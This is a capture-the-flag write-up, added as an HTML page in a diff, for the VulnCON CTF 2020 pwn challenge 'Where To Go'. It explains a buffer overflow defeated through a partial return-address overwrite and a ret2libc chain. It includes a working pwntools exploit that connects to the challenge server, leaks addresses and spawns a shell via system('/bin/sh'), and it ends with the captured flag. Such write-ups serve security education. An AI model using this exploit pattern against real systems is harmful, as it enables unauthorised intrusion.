@@ -1,0 +1,83 @@
+<!--Solve date: 12/20/2020-->
+
+<h1>VulnCON CTF 2020 - Where To Go</h1>
+
+<h2>Binary Exploitation - 413 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Program Behavior</h5>
+
+<p>The operation of this binary is straightforward - it writes "Hello!" and calls another function that reads 320 bytes from the standard input into a buffer. This function returns to <code>main()</code> and that is it.</p>
+
+<image class = "small" src = "./images/vulncon_wheretogo_1.png"/>
+
+<p class = "caption">Figure 1. Main function that sets the buffering, writes "Hello!", and calls the vulnerable subroutine.</p>
+
+<image class = "small" src = "./images/vulncon_wheretogo_2.png"/>
+
+<p class = "caption">Figure 2. The vulnerable subroutine, which reads 0x140 = 320 bytes from standard input into a stack buffer.</p>
+
+<h5>Obtaining Leaks and ROP</h5>
+
+<p>As in most of the other pwn challenges in this CTF, we have a buffer overflow. However, in this challenge, the binary is position independent (PIE enabled), and we do not have a leak before the first overflow. However, we recall that because <code>main()</code> calls the vulnerable function, a text address is available on the stack. With a partial address overwrite, we can return to one location within the text. If these two functions (along with the other standard ELF constructs) are the only ones available to us, then we would probably be out of luck, since there are no "one-shot gadgets" that would leak information and return to perform a second overflow.</p>
+
+<p>However, if we turn off IDA's graph view and peek just after the vulnerable function at offset <code>0x899</code>, it happens that there is a <i>very</i> useful gadget that (1) leaks the address of <code>main()</code> and returns to <code>main()</code> at the end.</p>
+
+<image class = "small" src = "./images/vulncon_wheretogo_3.png"/>
+
+<p class = "caption">Figure 3. A handy function that provides a leak and a chance for a second overflow.</p>
+
+<p>Since the return address of the vulnerable function within <code>main()</code> is at offset <code>0x86c</code>, we can just overwrite one byte of the return address to <code>0x99</code> to execute this special gadget. Following this, with PIE defeated, it is just a matter of leaking libc (through <code>write()</code>) and calling <code>system("/bin/sh"</code> as in a typical ROP exploit.</p>
+
+<p>I would like to point out that this extra function (that really makes or breaks this exploit) feels a little <i>too</i> convenient. It's good to pause and reflect whether and how a piece of code may be used in practice. It's hard to see what the use of the code shown in Fig. 3 would be. If such a vulnerability were to exist, gadgets with functionality such as the one in Fig. 3 are likely deeply embedded within a large codebase.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+
+from pwn import *
+
+ready = True
+debug = False
+
+if ready:
+    p = remote("35.232.11.215", 49155)
+    libc = ELF("./looping/libc.so.6")
+else:
+    p = process("./where_to_go")
+    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+    context.terminal = ["/mnt/c/Users/********/wsl-terminal/open-wsl.exe", "-e"]
+    if debug:
+        gdb.attach(p)
+
+ret_offs = 0x872
+main_offs = 0x7da
+write_got_offs = 0x200fb8
+write_plt_offs = 0x680
+poprdi_ret_offs = 0x943
+poprsi_popr15_ret_offs = 0x941
+
+# first, we need to find the image base
+p.recvline()
+p.send(0x20 * b'\x01' + p64(0xdeadbeef) + p8(0x99)) #partial overwrite
+textBase = u64(p.recv(6) + b"\x00\x00") - main_offs
+log.info("Leaked text address: %s" % (hex(textBase)))
+
+p.send(0x20 * b'\x01' + p64(0xdeadbeef) + p64(textBase + ret_offs) + p64(textBase + poprdi_ret_offs) + p64(0x1) + p64(textBase + poprsi_popr15_ret_offs) + p64(textBase + write_got_offs) + p64(0xcafebabe) + p64(textBase + write_plt_offs) + p64(textBase + main_offs))
+
+p.recvline()
+libc.address = u64(p.recv(8)) - libc.sym["write"]
+log.info("Leaked libc address: %s" % (hex(libc.address)))
+
+p.recv()
+p.send(0x20 * b'\x01' + p64(0xdeadbeef) + p64(textBase + poprdi_ret_offs) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym["system"]))
+
+p.interactive()    
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>vulncon{4s1r_4nd_p13_c4n7_s70p_us}</code></p>
